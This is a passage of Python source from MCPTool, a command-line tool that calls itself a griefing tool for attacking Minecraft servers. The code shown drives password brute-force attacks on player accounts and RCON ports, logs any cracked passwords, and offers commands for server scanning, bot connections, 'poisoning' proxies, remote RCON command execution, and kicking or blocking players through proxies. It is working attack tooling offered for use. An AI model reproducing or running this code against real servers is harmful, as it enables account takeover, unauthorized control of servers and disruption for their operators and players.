                    print(f"{banner}\n\n    {red}[{lred}ERR{lwhite}OR{red}] {lred}Timeout. {lwhite}(It's been a long time and the server is not responding)")
                    return

                except ConnectionRefusedError:
                    subprocess.run('cls || clear', shell=True)
                    print(f'{banner}\n\n    {red}[{lred}ERR{lwhite}OR{red}] {lred}Refused Connection!')
                    return

                except KeyboardInterrupt:
                    subprocess.run('cls || clear', shell=True)
                    print(f'{banner}\n\n    {red}[{lred}CTRL{lwhite}-C{red}] {lwhite}Stopping the brute force attack (RCON).. ')
                    return

                except MCRconException:
                    pass

            attack_finished = True

        except KeyboardInterrupt:
            subprocess.run('cls || clear', shell=True)
            print(f'{banner}\n\n    {red}[{lred}CTRL{lwhite}-C{red}] {lwhite}Stopping the brute force attack (RCON).. ')
            break


def auth_command(target, username, protocol, file):
    """
    Run my Script 'Auth_Bruteforce.py' to perform a brute force attack
    """

    check = check_ip_port(target)

    if not check:
        return

    check = check_server(target)

    if not check:
        print(f'\n    {red}[{lred}ERR{lwhite}OR{red}] {lwhite}The connection to the server could not be established. Enter a valid server!')
        return

    target = target.split(':')
    print(f'\n    {red}[{lred}AU{lwhite}TH{red}] {lwhite}Preparing brute force attack against account {username} on server {target[0]}:{target[1]}..')
    time.sleep(0.8)

    try:
        f = open(file, 'r', encoding='utf8')
        passwords = f.readlines()
        f.close()

    except FileNotFoundError:
        print(f'\n    {red}[{lred}ERR{lwhite}OR{red}] {lwhite}The file {file} was not found.')
        return

    number_of_passwords = 0

    for _ in passwords:
        number_of_passwords += 1

    if number_of_passwords == 0:
        print(f'\n    {red}[{lred}ERR{lwhite}OR{red}] {lwhite}The file is empty!')
        return

    if number_of_passwords > 1:
        text = 'passwords'

    else:
        text = 'password'

    print(f'\n    {red}[{lred}FI{lwhite}LE{red}] {lwhite}Selected file: {file} ({lgreen}{number_of_passwords} {text}{lwhite})')
    time.sleep(0.8)

    print(f'\n    {red}[{lred}AU{lwhite}TH{red}] {lwhite}Starting the attack..')
    process = subprocess.Popen(f'{sys.executable} settings/scripts/Auth_Bruteforce.py -host {target[0]} -p {target[1]} -v {protocol} -n {username} -f {file}', stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True, shell=True)

    while True:
        try:
            time.sleep(0.05)
            text = str(process.stdout.readline()).replace("b'", '').replace(r"\r\n'", '')

            if '[[CONNECTED]]' in text:
                subprocess.run('cls || clear', shell=True)
                print(f'{banner}\n\n    {red}[{lred}AU{lwhite}TH{red}] {lwhite}The Bot has connected to the server')

            elif '[[TESTING]]' in text:
                password = text.replace('[[TESTING]] ', '')
                subprocess.run('cls || clear', shell=True)
                print(f'{banner}\n\n    {red}[{lred}AU{lwhite}TH{red}] {lwhite}Testing the password: {lgreen}{password}')

            elif '[[KICK]]' in text:
                reason = text.replace('[[KICK]] "', '')
                reason = reason[:-1]
                reason = reason.replace(r'\xa70', '§0').replace(r'\xa71', '§1').replace(r'\xa72', '§2').replace(r'\xa73', '§3').replace(r'\xa74', '§4').replace(r'\xa75', '§5').replace(r'\xa76', '§6').replace(r'\xa77', '§7').replace(r'\xa78', '§8').replace(r'\xa79', '§9').replace(r'\xa7a', '§a').replace(r'\xa7b', '§b').replace(r'\xa7c', '§c').replace(r'\xa7d', '§d').replace(r'\xa7e', '§e').replace(r'\xa7f', '§f').replace(r'\xa7l', '§l').replace(r'\xa7m', '§m').replace(r'\xa7n', '§n').replace(r'\xa7o', '§o').replace(r'\xa7r', '§r').replace(r'\xa7A', '§A').replace(r'\xa7B', '§B').replace(r'\xa7C', '§C').replace(r'\xa7D', '§D').replace(r'\xa7E', '§E').replace(r'\xa7F', '§F').replace(r'\xa7K', '§K').replace(r'\xa7L', '§L').replace(r'\xa7M', '§M').replace(r'\xa7N', '§N').replace(r'\xa7R', '§O').replace(r'\xf1', 'ñ')
                reason = remove_json_characters(reason)
                reason = replace_color_characters(reason)
                subprocess.run('cls || clear', shell=True)
                print(f'{banner}\n\n    {red}[{lred}AU{lwhite}TH{red}] {lwhite}Kick: {lred}{reason}')

            elif '[[NOT-FOUND]]' in text:
                attempts = text.replace('[[NOT-FOUND]] ', '')
                subprocess.run('cls || clear', shell=True)
                print(f'{banner}\n\n    {red}[{lred}AU{lwhite}TH{red}] {lwhite}The attack is over and the password has not been found. ({attempts} passwords were tried)')
                process.kill()
                break

            elif '[[PASSWORD]]' in text:
                check_folder('logs', 'logs/auth')
                password = text.replace('[[PASSWORD]] ', '')
                save_logs(username, f'logs/auth/{username}', 'auth', f'Password: {password}')
                subprocess.run('cls || clear', shell=True)
                print(f'{banner}\n\n    {red}[{lred}AU{lwhite}TH{red}] {lgreen}Password found! {lwhite}The password for {lred}{username} {lwhite}is: {lred}{password}')
                process.kill()
                break

            elif 'node:internal/process/promises' in text:
                check_folder('logs', 'logs/errors')
                save_logs(None, 'logs/errors/AUTH_', 'error', f'Error: {text}')
                print(f'\n    {red}[{lred}ERR{lwhite}OR{red}] {lwhite}The server rejected the connection.')
                break

            if process.poll() is not None:
                print(f'\n    {red}[{lred}ERR{lwhite}OR{red}] {lwhite}The bot could not connect to the server. ')
                break

        except KeyboardInterrupt:
            process.kill()
            break


def connect_command(target, username, protocol, proxy):
    """
    Use my Connect.js script to send a bot so I can control it.
    """

    check = check_ip_port(target)

    if not check:
        return

    target = target.split(':')

    if proxy is not None:
        show_proxy = f'{lgreen}Yes'

    else:
        show_proxy = f'{lred}No'

    connect_banner = rf"""{red}
                                                         
                                                        d8P  
                                                     d888888P     {lwhite}Target: {lgreen}{target[0]}:{target[1]}{red}
     d8888b d8888b   88bd88b   88bd88b  d8888b d8888b  ?88'       {lwhite}Protocol: {lred}{protocol}{red}
    d8P' `Pd8P' ?88  88P' ?8b  88P' ?8bd8b_,dPd8P' `P  88P        {lwhite}Username: {lcyan}{username}{red}
    88b    88b  d88 d88   88P d88   88P88b    88b      88b        
    `?888P'`?8888P'd88'   88bd88'   88b`?888P'`?888P'  `?8b       {lwhite}Proxy: {show_proxy}{red}
                                                         
"""

    date = datetime.now()
    file = f'connect_{str(date.day)}-{str(date.month)}-{str(date.year)}_{str(date.hour)}.{str(date.minute)}.{str(date.second)}.txt'
    subprocess.run('cls || clear', shell=True)
    print(f'{connect_banner}\n    {lwhite}[{lgreen}#{lwhite}] Connecting to the server..')
    time.sleep(1)

    try:
        if proxy is not None:
            proxy = proxy.split(':')
            subprocess.run(f'{node_command} settings/scripts/Connect.js {target[0]} {target[1]} {username} {protocol} {file} {proxy[0]} {proxy[1]}', shell=True)
        else:
            subprocess.run(f'{node_command} settings/scripts/Connect.js {target[0]} {target[1]} {username} {protocol} {file}', shell=True)

        reason = get_text(file)
        reason = remove_json_characters(reason)
        reason = replace_color_characters(reason)
        print(f'\n    [{lred}#{lwhite}] Disconnected: {reason}')
        os.remove(file)

    except KeyboardInterrupt:
        pass

    except FileNotFoundError:
        print(f'\n    [#] Disconnected: Unknown reason')
        pass


def rconnect_command(target, password):
    """
    Connect to a server via RCON
    """

    check = check_ip_port(target)

    if not check:
        return

    target = target.split(':')
    print(f'\n    {red}[{lred}RC{lwhite}ON{red}] {lwhite}Connecting to the server..')
    time.sleep(0.8)

    try:
        with MCRcon(target[0], password, int(target[1]), timeout=35) as mcr:
            print(f'\n    {red}[{lred}RC{lwhite}ON{red}] {lgreen}Connection established successfully. ({lwhite}{target[0]}:{target[1]}{lgreen})\n')

            while True:
                command = input(f'    {red}[{lgreen}#{red}]{lwhite} Command: ')
                resp = mcr.command(command)
                resp = remove_json_characters(resp)
                resp = replace_color_characters(resp)
                print(f'\n    {resp}\n')

    except TimeoutError:
        print(f"\n    {red}[{lred}ERR{lwhite}OR{red}] {lred}Timeout. {lwhite}(It's been a long time and the server is not responding)")
        return

    except ConnectionRefusedError:
        print(f'\n    {red}[{lred}ERR{lwhite}OR{red}] {lred}Refused Connection!')
        return

    except KeyboardInterrupt:
        mcr.disconnect()
        print(f'\n\n    {red}[{lred}CTRL{lwhite}-C{red}] {lwhite}Stopping the connection.. ')
        return

    except MCRconException:
        print(f'\n    {red}[{lred}RC{lwhite}ON{red}] {lred}Invalid data.')
        pass


def main():
    """
    Commands
    """

    global servers_found, scan_stopped

    while True:
        scan_stopped = False
        servers_found = 0

        try:
            arguments = input(f'\n{reset}{red}    root@windows:~/MCPTool/ {lblack}» {lwhite}').split()
            command = arguments[0].lower()

            if command == 'help':  # Show help message
                try:
                    option = arguments[1]

                    if option == 'all':
                        print(help_message)

                    else:
                        num = 0
                        valid_command = False

                        for cmd in command_list:
                            if option.lower() == cmd:
                                print(help_messages_list_commands[num])
                                valid_command = True
                                break

                            num += 1

                        if not valid_command:
                            print(f'\n    {red}[{lred}ERR{lwhite}OR{red}] {lwhite}Enter a valid command.')

                except IndexError:
                    print(f'\n{lwhite}    Usage: help <all/command>\n\n    {lwhite}You can also see the guide I made in Google Docs: {lgreen}bit.ly/mcptool-guide')

            elif command == 'clear' or command == 'cls':
                subprocess.run('cls || clear', shell=True)
                print(banner, end='')

            elif command == 'server' or command == 'srv' or command == '0':
                try:
                    server = arguments[1]
                    server_command(server)

                except IndexError:
                    print(f'\n{lwhite}    [{lred}!{lwhite}] Usage: {lred}{arguments[0]}{lwhite} <ip:port/domain>')

            elif command == 'player' or command == '1':
                try:
                    username = arguments[1]
                    player_command(username)
                
                except IndexError:
                    print(f'\n{lwhite}    [{lred}!{lwhite}] Usage: {lred}{arguments[0]}{lwhite} <username>')

            elif command == 'ip':
                try:
                    domain = arguments[1]
                    ip_address = socket.gethostbyname(domain)
                    print(f'\n    {red}[{lred}I{white}P{red}] {white}{ip_address}')

                except socket.error:
                    print(f'\n    {red}[{lred}ERR{white}OR{red}] {white}The domain is not valid.')

                except IndexError:
                    print(f'\n{lwhite}    [{lred}!{lwhite}] Usage: {lred}{arguments[0]}{lwhite} <domain>')

            elif command == 'ipinfo':
                try:
                    ip_address = arguments[1]
                    ipinfo_command(ip_address)

                except IndexError:
                    print(f'\n{lwhite}    [{lred}!{lwhite}] Usage: {lred}{arguments[0]}{lwhite} <ip>')

            elif command == 'dnslookup':
                try:
                    domain = arguments[1]
                    dnslookup_command(domain)

                except IndexError:
                    print(f'\n{lwhite}    [{lred}!{lwhite}] Usage: {lred}{arguments[0]}{lwhite} <domain>')

            elif command == 'search' or command == '4':
                try:
                    arguments[1]
                    search_command(arguments)

                except IndexError:
                    print(f'\n{lwhite}    [{lred}!{lwhite}] Usage: {lred}{arguments[0]}{lwhite} <data>')

            elif command == 'scan' or command == '5':
                try:
                    ip = arguments[1]
                    ports = arguments[2]
                    method = arguments[3]
                    connect_bot = arguments[4].lower()
                    method = check_scan_method(method)

                    if method[0]:
                        if connect_bot == 'y' or connect_bot == 'n':
                            try:
                                proxy = arguments[5]
                                
                                if proxy.lower() == 'random':
                                    proxy = set_proxy('random')

                                    if not proxy:
                                        continue

                                else:
                                    check = set_proxy(proxy)

                                    if not check:
                                        continue

                            except IndexError:
                                proxy = None

                            error = scan_command(ip, ports, method[1], connect_bot, proxy, None)
                            
                            if not error:
                                if servers_found >= 1:
                                    print(f'\n    {red}[{lred}FINI{lwhite}SHED{red}] {lwhite}The scan finished and found {servers_found} servers.')

                                else:
                                    print(f'\n    {red}[{lred}FINI{lwhite}SHED{red}] {lred}The scan has finished and no servers were found.')
                                
                        else:
                            print(f'\n    {red}[{lred}ERR{lwhite}OR{red}] {lwhite}You must specify if you want a bot to check the server (y/n).')

                    else:
                        print(f'\n    {red}[{lred}ERR{lwhite}OR{red}] {lwhite}Enter a valid method. \n\n     {lwhite}0 - {lred}Nmap\n     {lwhite}1 - {lred}QuboScanner')
                
                except IndexError:
                    print(f'\n{lwhite}    [{lred}!{lwhite}] Usage: {lred}{arguments[0]}{lwhite} <ip> <ports> <method> <send bot: y/n> [<proxy>]')

            elif command == 'host' or command == '6':
                try:
                    hostname = arguments[1]
                    ports = arguments[2]
                    method = arguments[3]
                    connect_bot = arguments[4].lower()

                    if hostname in host_list:
                        method = check_scan_method(method)

                        if method[0]:
                            if connect_bot == 'y' or connect_bot == 'n':
                                try:
                                    proxy = arguments[5]
                                    
                                    if proxy.lower() == 'random':
                                        proxy = set_proxy('random')

                                        if not proxy:
                                            continue

                                    else:
                                        check = set_proxy(proxy)

                                        if not check:
                                            continue

                                except IndexError:
                                    proxy = None

                                host_command(hostname, ports, method, connect_bot, proxy)

                            else:
                                print(f'\n    {red}[{lred}ERR{lwhite}OR{red}] {lwhite}You must specify if you want a bot to check the server (y/n).')

                        else:
                            print(f'\n    {red}[{lred}ERR{lwhite}OR{red}] {lwhite}Enter a valid method. \n\n     {lwhite}0 - {lred}Nmap\n     {lwhite}1 - {lred}QuboScanner')
                    
                    else:
                        print(f'\n    {red}[{lred}ERR{lwhite}OR{red}] {lwhite}Enter a valid host. ({lgreen}', end='')
                        hosts = ''

                        for ht in hosts:
                            hosts = f'{hosts}{ht} '

                        hosts = hosts[:-1]
                        print(f'{hosts}{lwhite})')

                except IndexError:
                    print(f'\n{lwhite}    [{lred}!{lwhite}] Usage: {lred}{arguments[0]} {lwhite}<hostname> <ports> <method> <send bot: y/n> [<proxy>]')

            elif command == 'checker' or command == '7':
                try:
                    file = arguments[1]
                    connect_bot = arguments[2].lower()

                    if connect_bot == 'y' or connect_bot == 'n':
                        try:
                            proxy = arguments[3]
                                
                            if proxy.lower() == 'random':
                                proxy = set_proxy('random')

                                if not proxy:
                                    continue

                            else:
                                check = set_proxy(proxy)

                                if not check:
                                    continue

                        except IndexError:
                            proxy = None

                        checker_command(file, connect_bot, proxy)

                    else:
                        print(f'\n    {red}[{lred}ERR{lwhite}OR{red}] {lwhite}You must specify if you want a bot to check the server (y/n).')

                except IndexError:
                    print(f'\n{lwhite}    [{lred}!{lwhite}] Usage: {lred}{arguments[0]} {lwhite}<file> <send bot: y/n> [<proxy>]')

            elif command == 'listening' or command == '8':
                try:
                    server = arguments[1]
                    listening_command(server)

                except IndexError:
                    print(f'\n{lwhite}    [{lred}!{lwhite}] Usage: {lred}{arguments[0]} {lwhite}<domain/ip:port>')

            elif command == 'bungee' or command == '9':
                try:
                    server = arguments[1]
                    start_proxy_server(server, bungee_port, 'bungee', False)

                except IndexError:
                    print(f'\n{lwhite}    [{lred}!{lwhite}] Usage: {lred}{arguments[0]} {lwhite}<domain/ip:port>')

            elif command == 'poisoning' or command == '10':
                try:
                    server = arguments[1]
                    start_proxy_server(server, poisoning_port, 'poisoning', True)

                except IndexError:
                    print(f'\n{lwhite}    [{lred}!{lwhite}] Usage: {lred}{arguments[0]} {lwhite}<domain/ip:port>')

            elif command == 'rcon' or command == '11':
                try:
                    target = arguments[1]
                    password_list = arguments[2]
                    rcon_command(target, password_list)

                except IndexError:
                    print(f'\n{lwhite}    [{lred}!{lwhite}] Usage: {lred}{arguments[0]} {lwhite}<ip:rcon-port> <file>')

            elif command == 'auth' or command == '12':
                try:
                    target = arguments[1]
                    username = arguments[2]
                    protocol = arguments[3]
                    file = arguments[4]
                    auth_command(target, username, protocol, file)

                except IndexError:
                    print(f'\n{lwhite}    [{lred}!{lwhite}] Usage: {lred}{arguments[0]} {lwhite}<ip:port> <username> <protocol> <file>')

            elif command == 'connect' or command == '13':
                try:
                    target = arguments[1]
                    username = arguments[2]
                    protocol = arguments[3]

                    try:
                        proxy = arguments[4]
                                
                        if proxy.lower() == 'random':
                            proxy = set_proxy('random')

                            if not proxy:
                                continue

                        else:
                            check = set_proxy(proxy)

                            if not check:
                                continue

                    except IndexError:
                        proxy = None

                    connect_command(target, username, protocol, proxy)

                except IndexError:
                    print(f'\n{lwhite}    [{lred}!{lwhite}] Usage: {lred}{arguments[0]} {lwhite}<ip:port> <username> <protocol> [<proxy>]')

            elif command == 'rconnect' or command == '14':
                try:
                    target = arguments[1]
                    password = arguments[2]
                    rconnect_command(target, password)

                except IndexError:
                   print(f'\n{lwhite}    [{lred}!{lwhite}] Usage: {lred}{arguments[0]} {lwhite}<ip:rcon-port> <password>')

            elif command == 'kick' or command == '15':
                try:
                    target = arguments[1]
                    username = arguments[2]
                    protocol = arguments[3]

                    try:
                        proxy = arguments[4]
        
                        if proxy.lower() == 'random':
                            proxy = set_proxy('random')

                            if not proxy:
                                continue

                        else:
                            check = set_proxy(proxy)

                            if not check:
                                continue

                    except IndexError:
                        proxy = None

                    kick_player(target, username, protocol, proxy, 'kick', 'KI', 'CK')

                except IndexError:
                    print(f'\n{lwhite}    [{lred}!{lwhite}] Usage: {lred}{arguments[0]} {lwhite}<ip:port> <username> <protocol> [<proxy>]')

            elif command == 'kickall' or command == '16':
                try:
                    target = arguments[1]
                    protocol = arguments[2]

                    try:
                        proxy = arguments[3]
        
                        if proxy.lower() == 'random':
                            proxy = set_proxy('random')

                            if not proxy:
                                continue

                        else:
                            check = set_proxy(proxy)

                            if not check:
                                continue

                    except IndexError:
                        proxy = None

                    kick_player(target, None, protocol, proxy, 'kickall', 'KICK', 'ALL')

                except IndexError:
                    print(f'\n{lwhite}    [{lred}!{lwhite}] Usage: {lred}{arguments[0]} {lwhite}<ip:port> <protocol> [<proxy>]')

            elif command == 'block' or command == '17':
                try:
                    target = arguments[1]
                    username = arguments[2]
                    protocol = arguments[3]

                    try:
                        proxy = arguments[4]
        
                        if proxy.lower() == 'random':
                            proxy = set_proxy('random')

                            if not proxy:
                                continue

                        else:
                            check = set_proxy(proxy)

                            if not check:
                                continue

                    except IndexError:
                        proxy = None

                    kick_player(target, username, protocol, proxy, 'block', 'BLO', 'CK')

                except IndexError:
                    print(f'\n{lwhite}    [{lred}!{lwhite}] Usage: {lred}{arguments[0]} {lwhite}<ip:port> <username> <protocol> [<proxy>]')

            elif command == 'discord':
                print(f'''{lcyan}
                               
             ░░░░░░        ░░░░░
          ░░░░░░░░░░░░░░░░░░░░░░░░░          {magenta}Watermelon Discord Server{lcyan}
         ░░░░░░░░░░░░░░░░░░░░░░░░░░░  
        ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░        {lwhite}Join my discord server for:{lcyan}
       ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
       ░░░░░░░░░▒▒░░░░░░░░░▒▒▒░░░░░░░░░       {lwhite}- Get help or report a bug about the tool.{lcyan}
      ░░░░░░░░▒▒▒▒▒▒░░░░░▒▒▒▒▒▒░░░░░░░░       {lwhite}- Stay up to date with my projects.{lcyan}
      ░░░░░░░░▒▒▒▒▒▒░░░░░░▒▒▒▒▒░░░░░░░░       {lwhite}- You can also talk to me through the server.{lcyan}
      ░░░░░░░░░░░░░░░░░░░░░░▒░░░░░░░░░░
      ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░      {lred}> {lwhite}Server link: {lred}discord.gg/ewPyW4Ghzj{lcyan}
      ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
         ░░░░░░░             ░░░░░░░
             ░░                ░\n''')

            else:
                print(f'\n    {red}[{red}-{red}] {lred}Unknown command. {lwhite}Type {lgreen}help {lwhite}to see the available commands.')

        except EOFError:
            pass

        except KeyboardInterrupt:
            print(f'\n\n    {red}[{red}>{red}] {lwhite}Closing MCPTool... # Created by {lcyan}@wrrulos{reset}')
            sys.exit()

        except IndexError:
            print(f'\n    {red}[{red}-{red}] {lred}Unknown command. {lwhite}Type {lgreen}help {lwhite}to see the available commands.')


if __name__ == '__main__':
    try:
        subprocess.run('cls || clear', shell=True)
        print(f'{start_banner}                                                    {lwhite}Starting {lred}MCP{lwhite}Tool..')
        time.sleep(0.5)
        save_settings()

        if version_check:  # If you have the 'version_check' option enabled in settings.json:
            check = check_version()  # Look for a possible update

            if check:  # If there is a new version available:
                subprocess.run('cls || clear', shell=True)
                print(f'{start_banner}                                  {lgreen}There is a new version of MCPTool available on Github!\n\n                                          {lwhite}You can download it now from Github!\n\n                                           {lgreen}https://github.com/wrrulos/MCPTool\n\n', end='')
                time.sleep(5)
                sys.exit()

        if os.name == 'nt':
            subprocess.run('title MCPTool - The Best Griefing Tool @wrrulos', shell=True)

    except KeyboardInterrupt:
        sys.exit()

    subprocess.run('cls || clear', shell=True)
    print(banner, end='')
    main()
